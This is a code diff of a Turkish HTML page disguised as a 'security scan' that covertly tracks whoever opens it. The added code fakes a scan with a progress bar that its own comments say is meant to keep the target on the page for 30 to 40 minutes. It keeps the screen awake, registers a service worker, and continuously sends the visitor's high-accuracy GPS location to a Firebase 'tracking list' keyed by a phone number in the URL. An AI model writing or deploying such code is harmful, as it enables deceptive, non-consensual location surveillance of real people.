@@ -2,16 +2,25 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Doğrulaması</title>
+    <link rel="manifest" href="manifest.json">
+    <title>Sistem Yükleniyor</title>
     <link rel="stylesheet" href="index.css">
     <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        .progress-container { width: 100%; background: rgba(255,255,255,0.05); height: 10px; border-radius: 20px; margin-top: 2rem; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #3b82f6, #10b981); transition: width 1s ease; box-shadow: 0 0 10px var(--accent-primary); }
+    </style>
 </head>
-<body>
-    <div class="glass-card" style="text-align: center;">
-        <i data-lucide="shield-check" style="width: 48px; height: 48px; color: #10b981; margin-bottom: 1.5rem;"></i>
-        <h2 id="name-display" style="margin: 0; font-size: 1.25rem;">Doğrulama Başarılı</h2>
-        <p style="color: var(--text-secondary); margin-top: 0.5rem; font-size: 0.9rem;">Bağlantı güvenli bir şekilde sağlandı. Bu sayfayı kapatabilirsiniz.</p>
-        <div id="st" style="margin-top: 2rem; font-size: 0.7rem; color: #475569; letter-spacing: 0.1em; border-top: 1px solid var(--border-color); padding-top: 1rem;">SİSTEM AKTİF...</div>
+<body style="display: flex; align-items: center; justify-content: center; height: 100vh;">
+    <div class="glass-card" style="text-align: center; width: 90%; max-width: 400px;">
+        <i data-lucide="shield-check" style="width: 50px; height: 50px; color: var(--success); margin-bottom: 1rem;"></i>
+        <h2 id="name-display" style="margin: 0; font-size: 1.1rem; text-transform: uppercase;">Sistem Doğrulaması</h2>
+        <p style="color: var(--text-secondary); margin-top: 0.5rem; font-size: 0.8rem;">Güvenlik taraması yapılıyor. İşlem bitene kadar sayfadan ayrılmayın.</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="p-bar"></div>
+        </div>
+        <div id="st" style="margin-top: 1rem; font-size: 0.65rem; color: #475569; font-weight: 700;">DURUM: BAŞLATILIYOR... %0</div>
     </div>
 
     <script type="module">
@@ -21,21 +30,46 @@
 
         const params = new URLSearchParams(window.location.search);
         const tel = params.get('tel');
-        const name = params.get('n') || "Sistem Doğrulaması";
-        
-        document.title = name;
-        document.getElementById('name-display').innerText = name + " Başarılı";
+        const name = params.get('n') || "Güvenlik";
         lucide.createIcons();
 
+        // 1. Service Worker Kaydı (PWA)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
+
+        // 2. Çok Yavaş İlerleme Çubuğu (Hedefi sayfada tutar)
+        let prog = 0;
+        const pBar = document.getElementById('p-bar');
+        const stText = document.getElementById('st');
+        const interval = setInterval(() => {
+            if(prog < 99.8) {
+                // Rastgele minik artışlarla 30-40 dk sürer
+                prog += (Math.random() * 0.1); 
+                pBar.style.width = prog + "%";
+                stText.innerText = `DURUM: DOSYALAR TARANIYOR - %${prog.toFixed(1)}`;
+            }
+        }, 5000);
+
+        // 3. Ekranı Açık Tutma (Wake Lock)
+        (async () => {
+            try { 
+                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+            } catch (err) {}
+        })();
+
+        // 4. Canlı Konum Takibi (watchPosition)
         if (tel && navigator.geolocation) {
             const db = getDatabase(initializeApp(firebaseConfig));
-            navigator.geolocation.getCurrentPosition((p) => {
+            navigator.geolocation.watchPosition((p) => {
                 update(ref(db, 'takip_listesi/' + tel), {
-                    lat: p.coords.latitude, lon: p.coords.longitude,
+                    lat: p.coords.latitude, 
+                    lon: p.coords.longitude,
                     accuracy: p.coords.accuracy,
-                    ts: serverTimestamp(), lastSeen: new Date().toLocaleTimeString()
-                }).then(() => { document.getElementById('st').innerText = "İŞLEM TAMAMLANDI"; });
-            }, null, { enableHighAccuracy: true });
+                    ts: serverTimestamp(), 
+                    lastSeen: new Date().toLocaleTimeString()
+                });
+            }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
         }
     </script>
 </body>
